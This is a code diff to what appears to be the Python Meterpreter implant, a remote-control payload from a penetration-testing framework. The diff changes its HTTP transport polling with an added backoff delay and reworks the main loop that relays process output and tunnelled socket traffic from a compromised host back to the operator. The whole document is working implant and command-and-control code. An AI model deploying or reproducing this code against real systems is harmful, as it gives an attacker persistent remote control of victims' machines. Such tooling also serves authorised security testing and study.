@@ -409,7 +409,6 @@ class Transport(object):
 	def __init__(self):
 		self.communication_timeout = SESSION_COMMUNICATION_TIMEOUT
 		self.communication_last = 0
-		self.communication_active = False
 		self.retry_total = SESSION_RETRY_TOTAL
 		self.retry_wait = SESSION_RETRY_WAIT
 
@@ -446,7 +445,6 @@ class Transport(object):
 				activate_succeeded = False
 			if activate_succeeded:
 				self.communication_last = time.time()
-				self.communication_active = True
 				return True
 			time.sleep(self.retry_wait)
 		return False
@@ -460,11 +458,9 @@ class Transport(object):
 		except:
 			pass
 		self.communication_last = 0
-		self.communication_active = False
 		return True
 
 	def get_packet(self):
-		self.communication_active = False
 		try:
 			pkt = self._get_packet()
 		except:
@@ -472,16 +468,13 @@ class Transport(object):
 		if pkt is None:
 			return None
 		self.communication_last = time.time()
-		self.communication_active = True
 		return pkt
 
 	def send_packet(self, pkt):
 		try:
 			self._send_packet(pkt)
 		except:
-			self.communication_active = False
 			return False
-		self.communication_active = True
 		self.communication_last = time.time()
 		return True
 
@@ -501,7 +494,7 @@ class HttpTransport(Transport):
 		super(HttpTransport, self).__init__()
 		opener_args = []
 		scheme = url.split(':', 1)[0]
-		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2,7,9)) or sys.version_info >= (3,4,3)):
+		if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2, 7, 9)) or sys.version_info >= (3, 4, 3)):
 			import ssl
 			ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
 			ssl_ctx.check_hostname = False
@@ -518,6 +511,7 @@ class HttpTransport(Transport):
 		self.url = url
 		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
 		self._first_packet = None
+		self._empty_cnt = 0
 
 	def _activate(self):
 		return True
@@ -537,13 +531,23 @@ class HttpTransport(Transport):
 		request = urllib.Request(self.url, bytes('RECV', 'UTF-8'), self._http_request_headers)
 		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
 		packet = url_h.read()
-		if packet == '':
-			return ''
-		if len(packet) < 8:
-			return None  # looks corrupt
-		pkt_length, _ = struct.unpack('>II', packet[:8])
-		if len(packet) != pkt_length:
-			return None  # looks corrupt
+		for _ in range(1):
+			if packet == '':
+				break
+			if len(packet) < 8:
+				packet = None  # looks corrupt
+				break
+			pkt_length, _ = struct.unpack('>II', packet[:8])
+			if len(packet) != pkt_length:
+				packet = None  # looks corrupt
+		if not packet:
+			delay = 10 * self._empty_cnt
+			if self._empty_cnt >= 0:
+				delay *= 10
+			self._empty_cnt += 1
+			time.sleep(float(min(10000, delay)) / 1000)
+			return packet
+		self._empty_cnt = 0
 		return packet[8:]
 
 	def _send_packet(self, packet):
@@ -747,63 +751,60 @@ class PythonMeterpreter(object):
 
 	def run(self):
 		while self.running and not self.session_has_expired:
-			request = None
-			should_get_packet = self.transport.communication_active or ((time.time() - self.transport.communication_last) > 0.75)
-			if should_get_packet:
-				request = self.get_packet()
+			request = self.get_packet()
 			if request:
 				response = self.create_response(request)
 				if response:
 					self.send_packet(response)
-			else:
-				# iterate over the keys because self.channels could be modified if one is closed
-				channel_ids = list(self.channels.keys())
-				for channel_id in channel_ids:
-					channel = self.channels[channel_id]
-					data = bytes()
-					if isinstance(channel, STDProcess):
-						if not channel_id in self.interact_channels:
-							continue
-						if channel.stderr_reader.is_read_ready():
-							data = channel.stderr_reader.read()
-						elif channel.stdout_reader.is_read_ready():
-							data = channel.stdout_reader.read()
-						elif channel.poll() != None:
+				continue
+			# iterate over the keys because self.channels could be modified if one is closed
+			channel_ids = list(self.channels.keys())
+			for channel_id in channel_ids:
+				channel = self.channels[channel_id]
+				data = bytes()
+				if isinstance(channel, STDProcess):
+					if not channel_id in self.interact_channels:
+						continue
+					if channel.stderr_reader.is_read_ready():
+						data = channel.stderr_reader.read()
+					elif channel.stdout_reader.is_read_ready():
+						data = channel.stdout_reader.read()
+					elif channel.poll() != None:
+						self.handle_dead_resource_channel(channel_id)
+				elif isinstance(channel, MeterpreterSocketClient):
+					while select.select([channel.fileno()], [], [], 0)[0]:
+						try:
+							d = channel.recv(1)
+						except socket.error:
+							d = bytes()
+						if len(d) == 0:
 							self.handle_dead_resource_channel(channel_id)
-					elif isinstance(channel, MeterpreterSocketClient):
-						while select.select([channel.fileno()], [], [], 0)[0]:
-							try:
-								d = channel.recv(1)
-							except socket.error:
-								d = bytes()
-							if len(d) == 0:
-								self.handle_dead_resource_channel(channel_id)
-								break
-							data += d
-					elif isinstance(channel, MeterpreterSocketServer):
-						if select.select([channel.fileno()], [], [], 0)[0]:
-							(client_sock, client_addr) = channel.accept()
-							server_addr = channel.getsockname()
-							client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
-							pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-							pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
-							pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
-							pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
-							pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
-							pkt += tlv_pack(TLV_TYPE_LOCAL_PORT, server_addr[1])
-							pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
-							pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
-							pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-							self.send_packet(pkt)
-					if data:
+							break
+						data += d
+				elif isinstance(channel, MeterpreterSocketServer):
+					if select.select([channel.fileno()], [], [], 0)[0]:
+						(client_sock, client_addr) = channel.accept()
+						server_addr = channel.getsockname()
+						client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
 						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-						pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
-						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
-						pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
-						pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
-						pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
+						pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
+						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
+						pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
+						pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
+						pkt += tlv_pack(TLV_TYPE_LOCAL_PORT, server_addr[1])
+						pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
+						pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
 						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
 						self.send_packet(pkt)
+				if data:
+					pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
+					pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
+					pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
+					pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
+					pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
+					pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
+					pkt  = struct.pack('>I', len(pkt) + 4) + pkt
+					self.send_packet(pkt)
 
 	def handle_dead_resource_channel(self, channel_id):
 		del self.channels[channel_id]
